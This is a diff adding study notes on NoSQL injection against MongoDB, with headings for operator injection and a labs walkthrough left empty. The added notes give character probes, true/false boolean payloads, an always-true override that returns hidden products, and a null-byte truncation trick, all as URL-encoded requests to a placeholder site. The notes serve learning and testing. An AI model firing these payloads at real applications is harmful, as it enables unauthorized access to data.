@@ -32,4 +32,99 @@ In this example, we're injecting the fuzz string via the URL, so the string is U
 '\"`{\r;$Foo}\n$Foo \\xYZ\u0000
 ```
 
+### Determining which characters are processed
+
+inject individual characters to determine if they are interpreted as syntax by the application, this is testing the `'` character: `this.category == '''`
+
+can confirm by escaping the character with `\` in the query: `this.category == '\''`
+
+if this doesn't cause a syntax error, this means you might have an injection attack possibility
+
+### Confirming conditional behavior
+
+next step is to determine whether you can influence boolean conditions using NoSQL syntax
+
+send two requests, one with a false condition and one with a true condition. For example you could use the conditional statements `' && 0 && 'x` and `' && 1 && 'x`
+
+Like:
+```
+https://insecure-website.com/product/lookup?category=fizzy'+%26%26+0+%26%26+'x
+https://insecure-website.com/product/lookup?category=fizzy'+%26%26+1+%26%26+'x
+```
+
+### Overriding existing conditions
+
+you can attempt to override existing conditions to exploit the vulnerability. For example, you can inject a JavaScript condition that always evaluates to true, such as `'||'1'=='1`
+
+```
+https://insecure-website.com/product/lookup?category=fizzy%27%7c%7c%27%31%27%3d%3d%27%31
+```
+
+This results in the following MongoDB query: 
+
+```
+this.category == 'fizzy'||'1'=='1'
+```
+
+As the injected condition is always true, the modified query returns all items. This enables you to view all the products in any category, including hidden or unknown categories. 
+
+**Null character testing**
+
+You can also add a null character after the category value, the DB may ignore all characters after a null character
+
+```
+https://insecure-website.com/product/lookup?category=fizzy'%00
+```
+
+### NoSQL operator injection
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 ## Labs walkthrough
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
